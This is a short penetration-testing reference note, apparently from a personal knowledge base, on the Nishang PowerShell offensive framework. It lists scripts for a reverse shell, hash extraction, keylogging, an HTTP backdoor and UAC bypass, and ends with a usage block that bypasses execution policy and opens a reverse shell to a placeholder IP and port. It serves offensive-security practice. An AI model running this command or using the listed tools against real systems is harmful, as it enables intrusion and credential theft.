---
tags: [tool, activedirectory, powershell]
tool: "nishang"
category: "Active Directory"
installed: true
phase: [shells, post-exploit]
---

# Nishang - PowerShell Offensive Framework

## Tool Overview
Purpose: Collection of PowerShell scripts for penetration testing
Location: /usr/share/nishang/

## Key Scripts

### Shells
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 - Reverse shell

### Gather (Credential Theft)
/usr/share/nishang/Gather/Get-PassHashes.ps1 - Extract hashes
/usr/share/nishang/Gather/Keylogger.ps1 - Keylogging

### Backdoors
/usr/share/nishang/Backdoors/HTTP-Backdoor.ps1 - HTTP backdoor

### Escalation
/usr/share/nishang/Escalation/Invoke-PsUACme.ps1 - UAC bypass

## How to Use
powershell -ep bypass
. /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress YOUR_IP -Port 4444

## Related Tools
powersploit, powerview
